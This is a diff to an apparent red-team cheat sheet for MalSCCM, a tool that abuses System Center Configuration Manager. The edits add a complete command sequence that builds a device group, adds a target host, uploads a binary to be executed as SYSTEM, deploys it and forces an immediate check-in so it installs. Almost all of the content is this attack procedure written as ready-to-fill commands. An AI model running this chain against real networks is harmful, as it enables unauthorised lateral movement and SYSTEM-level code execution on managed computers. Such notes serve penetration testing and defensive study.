@@ -3,10 +3,6 @@
 https://github.com/nettitude/MalSCCM
 ```
 
-### Check if current host is managed by a System Centre Configuration Manager (SCCM)
-```
-MalSCCM.exe locate
-```
 
 ### List possible targets for lateral movement using SCCM
 ```
@@ -20,12 +16,22 @@ MalSCCM.exe inspect /server:<distributionPointServerFqdn> /groups
 
 ### List Computers, Groups, PrimaryUser, Forest, Packages, Applications and Deployments
 ```
-MalSCCM.exe inspect /all /server:<primarySiteFqdn>
+MalSCCM.exe inspect /all /server:<distributionPointServerFqdn>
 ```
 
-### Upload binary that will be executed as SYSTEM
+### Create new group for deployment
 ```
-MalSCCM.exe app /create /name:<appName> /uncpath:"\\<rhost>\SCCMContentLib$\<file>.exe"
+MalSCCM.exe group /create /groupname:<newGroup> /grouptype:device
+```
+
+### Add target computer to group
+```
+MalSCCM.exe group /addhost /groupname:<newGroup> /host:<computer>
+```
+
+### Add application and upload binary that will be executed as SYSTEM
+```
+MalSCCM.exe app /create /name:<appName> /uncpath:"\\<distributionPointServerFqdn>\SCCMContentLib$\<file>.exe"
 ```
 
 ### Check if application exists
@@ -35,7 +41,12 @@ MalSCCM.exe inspect /applications
 
 ### Deploy application
 ```
-MalSCCM.exe app /deploy /name:<appName> /groupname:<targetGroup> /assignmentname:<deploymentName>
+MalSCCM.exe app /deploy /name:<appName> /groupname:<newGroup> /assignmentname:<deploymentName>
+```
+
+### Initiate checkin (trigger installation as soon as possible)
+```
+MalSCCM.exe checkin /groupname:<newGroup>
 ```
 
 ### Check deployment status
